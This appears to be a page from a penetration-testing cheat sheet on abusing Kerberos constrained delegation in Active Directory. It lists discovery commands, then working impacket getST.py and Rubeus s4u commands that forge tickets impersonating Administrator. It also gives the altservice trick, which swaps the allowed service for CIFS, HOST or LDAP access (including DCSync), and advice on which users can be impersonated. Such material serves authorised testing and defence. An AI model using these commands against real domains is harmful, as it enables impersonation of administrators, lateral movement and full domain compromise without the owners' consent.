**Constrained delegation (KCD)** — an account configured with `msDS-AllowedToDelegateTo` may request Kerberos tickets to the listed SPNs *on behalf of other users* (S4U2proxy). If you compromise such an account, you can impersonate any user - including a Domain Admin - to those services. With **protocol transition** enabled you don't even need the user to authenticate first.

**Note:** Two flavours:
- **Without protocol transition** (`TrustedToAuthForDelegation` off) - the account can only forward a Kerberos ticket a user already presented. Harder to abuse standalone.
- **With protocol transition** (`TrustedToAuthForDelegation` on, "Use any authentication protocol") - the account can do S4U2self to mint its own evidence ticket for any user, then S4U2proxy to the target. This is the abusable case.

## Discovery

Impacket - lists accounts and what they can delegate to:

```bash

findDelegation.py 'DOMAIN/USER_NAME:USER_PASS'

```

```console

AccountName   AccountType  DelegationType              DelegationRightsTo
------------  -----------  --------------------------  --------------------------------
websvc        User         Constrained w/ Protocol T.  MSSQLSvc/SRV01.domain.local:1433
SRV02$        Computer     Constrained                 HOST/SRV01.domain.local

```

PowerView (Windows):

```powershell

Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

```

BloodHound: the `AllowedToDelegate` edge from the compromised principal to the target computer.

## Exploitation

You control an account (`DELEG_ACCOUNT`, user or computer) that has constrained delegation to an SPN on `TARGET`, and you know its NT hash / AES key / password.

### From Linux (impacket)

```bash

# Impersonate a domain admin to the allowed SPN
getST.py -spn 'CIFS/TARGET_FQDN' -impersonate 'Administrator' -hashes ':DELEG_ACCOUNT_NT_HASH' 'DOMAIN/DELEG_ACCOUNT'
export KRB5CCNAME=Administrator@CIFS_TARGET_FQDN.ccache

```

Then use the ticket - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

### From Windows (Rubeus)

```powershell

.\Rubeus.exe s4u /user:DELEG_ACCOUNT$ /rc4:DELEG_ACCOUNT_NT_HASH /impersonateuser:Administrator /msdsspn:CIFS/TARGET_FQDN /ptt

```

### Alternate-service trick

The service class in the requested SPN is not cryptographically bound in the resulting Service Ticket, so a single allowed SPN can be swapped for another service on the **same host** (e.g. delegation allowed to `TIME/TARGET`, but you request `CIFS/`, `HOST/`, `LDAP/`, `HTTP/` ...). This turns a low-value SPN into full host compromise (`CIFS/` for file/exec, `LDAP/` for DCSync on a DC).

```powershell

# Rubeus - request the allowed SPN but substitute a more useful service
.\Rubeus.exe s4u /user:DELEG_ACCOUNT$ /rc4:DELEG_ACCOUNT_NT_HASH /impersonateuser:Administrator /msdsspn:TIME/TARGET_FQDN /altservice:CIFS,HOST,LDAP /ptt

```

```bash

# impacket - -altservice does the same
getST.py -spn 'TIME/TARGET_FQDN' -altservice 'CIFS' -impersonate 'Administrator' -hashes ':DELEG_ACCOUNT_NT_HASH' 'DOMAIN/DELEG_ACCOUNT'

```

**Note:** `-impersonate` a user who is **not** marked "sensitive / cannot be delegated" and is not in the **Protected Users** group - S4U2proxy will refuse those.

## References

- impacket (getST.py) - https://github.com/fortra/impacket
- Rubeus - https://github.com/GhostPack/Rubeus
- The Hacker Recipes - Constrained delegation - https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained
- Elad Shamir - Wagging the Dog - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
